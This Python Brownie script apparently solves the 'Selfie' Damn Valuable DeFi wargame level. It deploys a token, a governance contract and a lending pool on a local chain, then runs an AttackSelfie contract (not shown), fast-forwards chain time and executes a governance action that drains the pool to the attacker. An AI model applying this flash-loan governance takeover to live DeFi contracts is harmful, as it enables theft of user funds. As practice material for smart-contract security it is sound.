from brownie import (
    DamnValuableTokenSnapshot,
    SelfiePool,
    SimpleGovernance,
    AttackSelfie,
)
from web3 import Web3
from brownie import web3
from brownie.network.state import Chain
import time
from scripts.helpful_scripts import get_accounts


def deploy():
    global deployer, attacker, TOKENS_IN_POOL, token, governance, pool
    [
        deployer,
        attacker,
    ] = get_accounts(2)
    # init token
    TOKEN_INITIAL_SUPPLY = Web3.toWei(2000000, "ether")
    TOKENS_IN_POOL = Web3.toWei(1500000, "ether")

    # 开始部署 https://docs.openzeppelin.com/contracts/3.x/api/token/erc20#ERC20Snapshot
    token = DamnValuableTokenSnapshot.deploy(TOKEN_INITIAL_SUPPLY, {"from": deployer})
    governance = SimpleGovernance.deploy(token, {"from": deployer})
    pool = SelfiePool.deploy(token, governance, {"from": deployer})

    token.transfer(pool, TOKENS_IN_POOL, {"from": deployer}).wait(1)
    assert token.balanceOf(pool) == TOKENS_IN_POOL

    return


def attack():
    # 攻击代码写到这里
    print("running func attack..")
    attack_contract = AttackSelfie.deploy(token, governance, pool, {"from": attacker})
    attack_contract.attack({"from": attacker})
    # 在区块链上的timestap 增加2天
    sec_2_days = 2 * 24 * 60 * 60
    web3.provider.make_request("evm_increaseTime", [sec_2_days])
    governance.executeAction(attack_contract.actionId(), {"from": attacker})
    return


def check():
    # 检测攻击是否完成
    print("running func check..")
    try:
        assert token.balanceOf(attacker) == TOKENS_IN_POOL
        assert token.balanceOf(pool) == 0
        print("success!")
    except:
        time.sleep(1)
        print("Not pass yet ;(")

    return


def main():
    deploy()
    attack()
    check()
